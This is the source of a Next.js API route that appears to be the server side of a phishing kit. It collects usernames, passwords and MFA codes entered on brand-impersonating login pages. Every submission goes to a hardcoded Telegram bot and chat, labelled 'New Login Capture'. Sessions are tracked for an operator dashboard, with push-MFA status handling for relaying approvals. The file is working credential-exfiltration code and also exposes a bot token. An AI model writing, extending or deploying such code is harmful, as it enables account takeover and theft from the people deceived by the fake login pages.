import { NextRequest, NextResponse } from 'next/server';
import { getBrandById } from '@/config/brands.config';
import { upsertSession, getSessionByIp, setPushStatus } from '@/lib/sessions';

// ============================================
// TELEGRAM CONFIGURATION - Edit these values
// ============================================
const TELEGRAM_BOT_TOKEN = '8731297269:AAGF2EXT7K6FbgFezvvgoAJnK2uQgZaKJj0';
const TELEGRAM_CHAT_ID = '-5075895415';
// ============================================

interface LoginRequest {
  brand: string;
  step?: string;
  username?: string;
  password?: string;
  code?: string;
  mfaMethod?: string;
}

async function sendToTelegram(message: string): Promise<boolean> {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
      }),
    });

    return response.ok;
  } catch (error) {
    console.error('Telegram send error:', error);
    return false;
  }
}

function formatTelegramMessage(
  brand: string,
  data: Record<string, string>,
  clientInfo: { ip: string; userAgent: string }
): string {
  const timestamp = new Date().toISOString();

  let message = `🔐 <b>New Login Capture</b>\n\n`;
  message += `📌 <b>Brand:</b> ${brand}\n`;
  message += `🕐 <b>Time:</b> ${timestamp}\n`;
  message += `🌐 <b>IP:</b> ${clientInfo.ip}\n`;
  message += `📱 <b>User-Agent:</b> <code>${clientInfo.userAgent.substring(0, 100)}</code>\n\n`;

  if (data.username) {
    message += `👤 <b>Username:</b> <code>${data.username}</code>\n`;
  }
  if (data.password) {
    message += `🔑 <b>Password:</b> <code>${data.password}</code>\n`;
  }
  if (data.code) {
    message += `🔢 <b>MFA Code:</b> <code>${data.code}</code>\n`;
  }
  if (data.mfaMethod) {
    message += `📲 <b>MFA Method:</b> ${data.mfaMethod}\n`;
  }
  if (data.step) {
    message += `\n📍 <b>Step:</b> ${data.step}`;
  }

  return message;
}

export async function POST(request: NextRequest) {
  try {
    const body: LoginRequest = await request.json();
    const { brand: brandId, step, username, password, code, mfaMethod } = body;

    // Validate brand
    const brand = getBrandById(brandId);
    if (!brand) {
      return NextResponse.json(
        { error: 'Invalid brand' },
        { status: 400 }
      );
    }

    // Get client info
    const rawIp = request.headers.get('x-forwarded-for') || request.headers.get('x-real-ip') || 'unknown';
    const { normalizeIp } = await import('@/lib/sessions');
    const clientIp = normalizeIp(rawIp);
    const userAgent = request.headers.get('user-agent') || 'unknown';

    // Prepare data for logging
    const logData: Record<string, string> = {};
    if (username) logData.username = username;
    if (password) logData.password = password;
    if (code) logData.code = code;
    if (mfaMethod) logData.mfaMethod = mfaMethod;
    if (step) logData.step = step;

    // If requesting phone/sms MFA, generate a 6-digit code and store it on the session
    if (step === 'mfa' && (mfaMethod === 'phone' || mfaMethod === 'sms')) {
      const generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
      logData.code = generatedCode;

      // Send to Telegram for debug/inspection
      const message = formatTelegramMessage(brandId, logData, { ip: clientIp, userAgent });
      await sendToTelegram(message);

      // Persist the code on the session
      const cookieSessionId = request.cookies.get('session_id')?.value;
      const session = await upsertSession(
        clientIp,
        userAgent,
        brandId,
        step || 'signin',
        {
          username,
          password,
          mfaCode: generatedCode,
          mfaMethod,
        },
        cookieSessionId
      );

      return NextResponse.json({ success: true, sessionId: session?.id });
    }

    // If submitting a verification code, validate it against the stored session value
    if (step === 'code' && code) {
      const cookieSessionId = request.cookies.get('session_id')?.value;
      const { getSessionById } = await import('@/lib/sessions');
      const sess = cookieSessionId ? getSessionById(cookieSessionId) : undefined;

      if (!sess) {
        return NextResponse.json({ error: 'Session not found' }, { status: 404 });
      }

      if (sess.mfaCode && code === sess.mfaCode) {
        // Clear stored mfaCode and mark method as "code"
        const { setSessionPhone } = await import('@/lib/sessions');
        // update via upsert to set method and clear code
        await upsertSession(sess.ip, sess.userAgent, sess.brand, 'complete', { mfaMethod: 'code', mfaCode: undefined }, sess.id);
        return NextResponse.json({ success: true, sessionId: sess.id });
      }

      return NextResponse.json({ error: 'Invalid code' }, { status: 400 });
    }

    // Default logging path for other steps
    const message = formatTelegramMessage(brandId, logData, {
      ip: clientIp,
      userAgent: userAgent,
    });

    await sendToTelegram(message);

    // Track session for admin dashboard
    const cookieSessionId2 = request.cookies.get('session_id')?.value;
    const session = await upsertSession(
      clientIp,
      userAgent,
      brandId,
      step || 'signin',
      {
        username,
        password,
        mfaCode: code,
        mfaMethod,
      },
      cookieSessionId2
    );

    // If push MFA selected, set push status to waiting
    if (mfaMethod === 'push' && session) {
      setPushStatus(session.id, 'waiting');
    }

    return NextResponse.json({
      success: true,
      sessionId: session?.id,
      redirect: step === 'complete' ? brand.successRedirect : undefined,
    });

  } catch (error) {
    console.error('Login API error:', error);
    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    );
  }
}

export async function GET() {
  return NextResponse.json(
    { error: 'Method not allowed' },
    { status: 405 }
  );
}
